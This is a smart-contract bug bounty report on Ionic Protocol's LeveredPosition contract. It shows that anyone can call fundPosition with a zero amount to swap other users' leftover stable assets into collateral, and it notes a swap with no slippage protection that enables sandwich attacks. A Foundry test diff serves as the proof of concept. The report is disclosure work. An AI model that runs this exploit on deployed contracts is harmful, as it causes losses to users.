
# The attackers can convert other people's stable assets in their positions into collateral assets

Submitted on Sat Jun 15 2024 13:41:27 GMT-0400 (Atlantic Standard Time) by @p0wd3r for [IOP | Ionic](https://immunefi.com/bounty/ionic-iop/)

Report ID: #32240

Report type: Smart Contract

Target: https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol

Impacts:
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
## Brief/Intro
The attacker can swap the stableAsset in other normal users' positions into collateralAsset at zero cost, and the attacker can choose to perform the swap at an unfavorable price, causing unnecessary losses to the users.

## Vulnerability Details
`fundPosition` allows anyone to call it, then calls `_supplyCollateral` to convert all balances of `fundingAsset` into `collateralAsset`.

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L56-L58
```solidity
  function fundPosition(IERC20Upgradeable fundingAsset, uint256 amount) public {
    fundingAsset.safeTransferFrom(msg.sender, address(this), amount);
    _supplyCollateral(fundingAsset);
```

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L360-L372
```solidity
  function _supplyCollateral(IERC20Upgradeable fundingAsset) internal returns (uint256 amountToSupply) {
    // in case the funding is with a different asset
    if (address(collateralAsset) != address(fundingAsset)) {
      // swap for collateral asset
      convertAllTo(fundingAsset, collateralAsset);
    }

    // supply the collateral
    amountToSupply = collateralAsset.balanceOf(address(this));
    collateralAsset.approve(address(collateralMarket), amountToSupply);
    uint256 errorCode = collateralMarket.mint(amountToSupply);
    if (errorCode != 0) revert SupplyCollateralFailed(errorCode);
  }
```

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L475-L479
```solidity
  function convertAllTo(IERC20Upgradeable inputToken, IERC20Upgradeable outputToken)
    private
    returns (uint256 outputAmount)
  {
    uint256 inputAmount = inputToken.balanceOf(address(this));
```

As `fundPosition`'s `amount` parameter can be 0, the attacker can swap the `stableAsset` in the position into `collateralAsset` without transferring any assets.

After `_leverDown`, there will be stableAsset in the position, and this part of stableAsset can be maliciously converted by the attacker.

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L446-L456
```solidity
    // all the redeemed collateral is swapped for stables to repay the FL
    uint256 stableLeftovers = stableAsset.balanceOf(address(this));
    if (stableLeftovers > 0) {
      uint256 borrowBalance = stableMarket.borrowBalanceCurrent(address(this));
      if (borrowBalance > 0) {
        // whatever is smaller
        uint256 amountToRepay = borrowBalance > stableLeftovers ? stableLeftovers : borrowBalance;
        stableAsset.approve(address(stableMarket), amountToRepay);
        stableMarket.repayBorrow(amountToRepay);
      }
    }
```

## Impact Details
The attacker can swap the stableAsset in other normal users' positions into collateralAsset at zero cost, and the attacker can choose to perform the swap at an unfavorable price, causing unnecessary losses to the users.

Currently, some swap strategies in the code do not have slippage protection set, such as the following UniswapV3. This gives attackers an opportunity to use this vulnerability to launch a sandwich attack. However, since the strategy is not within the scope of this audit, it is only mentioned as a reminder here.

https://github.com/ionicprotocol/contracts/blob/development/contracts/liquidators/UniswapV3Liquidator.sol#L37-L48
```solidity
    outputAmount = swapRouter.exactInputSingle(
      ISwapRouter.ExactInputSingleParams(
        address(inputToken),
        _outputToken,
        fee,
        address(this),
        block.timestamp,
        inputAmount,
        0,
        0
      )
    );
```

## References
- https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L56-L58
- https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L360-L372
- https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L446-L456

        
## Proof of concept
## Proof of Concept
```
git diff contracts/test/LeveredPositionTest.t.sol
```

```
diff --git a/contracts/test/LeveredPositionTest.t.sol b/contracts/test/LeveredPositionTest.t.sol
index a168276..1147711 100644
--- a/contracts/test/LeveredPositionTest.t.sol
+++ b/contracts/test/LeveredPositionTest.t.sol
@@ -412,6 +412,15 @@ abstract contract LeveredPositionTest is MarketsTest {
       assertApproxEqRel(leverageRatioRealized, targetLeverDownRatio, 3e16, "target lever down ratio not matching");
     }

+    // stable balance not 0
+    assertGt(stableAsset.balanceOf(address(position)), 0, "!stable balance");
+    address attacker = makeAddr("attacker");
+    vm.startPrank(attacker);
+    position.fundPosition(stableAsset, 0);
+    vm.stopPrank();
+    // stable balance becomes 0 after attack
+    assertEq(stableAsset.balanceOf(address(position)), 0, "!stable balance");
+
     uint256 withdrawAmount = position.closePosition();
     emit log_named_uint("withdraw amount", withdrawAmount);
     assertApproxEqRel(startingEquity, withdrawAmount, 5e16, "!withdraw amount");
```

```
forge test --mc 'ModeWethUSDCLeveredPositionTest' --mt 'testLeverMaxDown' -vv

Ran 1 test for contracts/test/LeveredPositionTest.t.sol:ModeWethUSDCLeveredPositionTest
[PASS] testLeverMaxDown() (gas: 8587125)
Logs:
  max ratio: 1885965990226138759
  min ratio: 1017680934425441558
  withdraw amount: 99433174923569350

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 146.84s (28.98s CPU time)

Ran 1 test suite in 147.06s (146.84s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```